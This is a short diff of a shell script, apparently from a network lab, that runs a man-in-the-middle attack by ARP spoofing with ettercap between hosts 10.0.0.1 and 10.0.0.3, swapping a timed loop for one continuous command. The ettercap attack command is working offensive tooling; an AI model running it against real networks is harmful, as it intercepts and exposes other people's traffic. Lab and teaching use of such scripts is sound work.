@@ -2,11 +2,8 @@
 #
 # implements the MitM attack via ARP spoofing
 
-while true
-do
-    ettercap -T -i attacker-eth0 -M arp:remote /10.0.0.1// /10.0.0.3// -s 's(60)q' 
-    sleep 20
-done
+ettercap -T -i attacker-eth0 -M arp /10.0.0.1// /10.0.0.3//
+
 
 # ettercap command explained argument-for-argument
 ## -T: runs ettercap in text-only mode
